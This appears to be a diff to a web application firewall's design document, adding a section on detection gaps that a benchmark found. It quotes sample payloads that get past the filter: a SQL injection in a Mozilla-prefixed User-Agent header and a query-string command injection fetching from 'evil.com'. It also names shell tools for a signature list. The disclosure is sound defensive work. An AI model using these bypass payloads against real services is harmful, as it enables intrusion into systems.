@@ -126,6 +126,35 @@ perspective:
   compile-time. A tenant cannot add a custom literal without forking
   and recompiling. Future work.
 
+### 3.2.1 Empirically observed detection gaps (round-2 benchmark)
+
+These are *specific* gaps surfaced by the live-stack benchmark in
+[`docs/benchmark.md`](docs/benchmark.md). They are consistent with
+the detector design (libinjection precision-over-recall + literal
+aho-corasick signatures); calling them out so operators don't have
+to discover them from production incidents.
+
+- **User-Agent SQLi with a `Mozilla/` prefix is not blocked.** A
+  payload like `User-Agent: Mozilla/5.0 1 OR 1=1` passes. libinjection
+  treats Mozilla-prefixed strings as user-agent content rather than a
+  SQL expression context; signatures only match scanner-UA literals
+  (sqlmap, nikto, etc.) and don't have a generic SQL-in-UA rule.
+  *Operator workaround*: add custom UA signatures upstream of the
+  WAF, or rely on backend validation of any field populated from the
+  User-Agent header. *Coverage as of round 2:* missed.
+- **Bare shell-command primitives in query strings (`;wget`, `;curl`,
+  `;nc`) are not blocked.** `$(whoami)` and `/bin/sh` are blocked
+  by the signatures group, but `?cmd=;wget evil.com/x` is not —
+  there's no literal signature for `;<cmd>` patterns. *Operator
+  workaround*: add `;wget`, `;curl`, `;nc`, `;bash` to a custom
+  signature set (compile-time today; future work for runtime
+  configurability). *Coverage as of round 2:* missed.
+
+Both gaps are consistent with the documented
+"precision-over-recall, atomic-token tests deliberately not
+flagged" stance — surfaced explicitly here so adopters don't infer
+coverage that isn't there.
+
 ### 3.3 Non-goals at the integrity level
 
 - **Validation of the plugin binary itself.** Cosign keyless
